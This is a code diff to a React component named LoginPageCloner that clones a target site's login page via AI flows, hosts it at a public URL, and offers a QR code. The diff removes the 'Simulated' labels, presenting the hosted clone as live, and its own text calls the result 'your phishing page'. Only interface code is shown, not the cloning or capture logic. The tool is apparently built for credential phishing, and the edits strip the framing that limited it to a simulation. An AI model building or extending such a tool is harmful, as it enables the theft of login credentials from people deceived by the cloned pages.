@@ -13,6 +13,7 @@ import { cloneLoginPage, type PageClonerOutput } from '@/ai/flows/page-cloner-fl
 import { hostClonedPage, type HostClonedPageOutput } from '@/ai/flows/host-cloned-page-flow';
 import { useToast } from '@/hooks/use-toast';
 import { QrCodeGenerator } from './qr-code-generator';
+import { Label } from './ui/label';
 
 const pageClonerSchema = z.object({
   targetUrl: z.string().url({ message: 'Please enter a valid URL to clone.' }),
@@ -63,7 +64,7 @@ export function LoginPageCloner() {
     try {
       const response = await hostClonedPage({ htmlContent: clonedHtml });
       setHostedPage(response);
-      toast({ title: "Page is Live (Simulated)", description: "Your page is now accessible at the public URL." });
+      toast({ title: "Page is Live", description: "Your page is now accessible at the public URL." });
     } catch (err) {
        const errorMessage = err instanceof Error ? err.message : 'An unknown error occurred.';
        setClonerError(errorMessage);
@@ -94,7 +95,7 @@ export function LoginPageCloner() {
         <Card>
           <CardHeader>
             <CardTitle>Page Cloner & Host</CardTitle>
-            <CardDescription>Create a static clone of a login page and host it on a public (simulated) URL.</CardDescription>
+            <CardDescription>Create a static clone of a login page and host it on a public URL.</CardDescription>
           </CardHeader>
           <CardContent>
             <Form {...form}>
@@ -154,14 +155,9 @@ export function LoginPageCloner() {
             {hostedPage && (
               <div className="space-y-4">
                 <div className="space-y-2">
-                  <Label htmlFor="public-url">Public URL (Simulated)</Label>
+                  <Label htmlFor="public-url">Hosted Page URL</Label>
                   <Input id="public-url" readOnly value={hostedPage.publicUrl} className="font-mono"/>
-                  <FormDescription>This is a shareable link to your phishing page.</FormDescription>
-                </div>
-                 <div className="space-y-2">
-                  <Label htmlFor="local-url">Local URL</Label>
-                  <Input id="local-url" readOnly value={hostedPage.localUrl} className="font-mono" />
-                   <FormDescription>The endpoint on this server that serves the content.</FormDescription>
+                  <FormDescription>This is a publicly accessible, shareable link to your phishing page.</FormDescription>
                 </div>
               </div>
             )}
